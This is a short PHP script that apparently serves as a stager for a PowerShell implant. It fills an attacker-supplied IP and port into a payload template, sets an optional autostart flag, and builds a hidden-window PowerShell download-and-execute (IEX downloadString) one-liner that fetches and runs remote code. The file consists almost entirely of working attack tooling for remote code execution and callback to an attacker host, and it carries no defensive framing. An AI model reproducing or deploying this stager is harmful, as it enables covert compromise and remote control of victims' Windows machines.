<?php

$ip = $_GET['i'];
$port = $_GET['p'];


$base_url = ( isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on' ? 'https' : 'http' ) . '://' .  $_SERVER['HTTP_HOST'];
$url = $base_url . $_SERVER["REQUEST_URI"];
$basePayload = base64_encode("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('".$url."')\"");

$payloadtemplate = file_get_contents('./payloadtemplate.ps1.txt');
$payloadtemplate = str_replace("%ip%", $ip, $payloadtemplate );
$payloadtemplate = str_replace("%port%", $port, $payloadtemplate );

if (isset($_GET['a'])){
    $payloadtemplate = str_replace("%autostart%", "\$true", $payloadtemplate );
} else {
    $payloadtemplate = str_replace("%autostart%", "\$false", $payloadtemplate );
}

echo $payloadtemplate;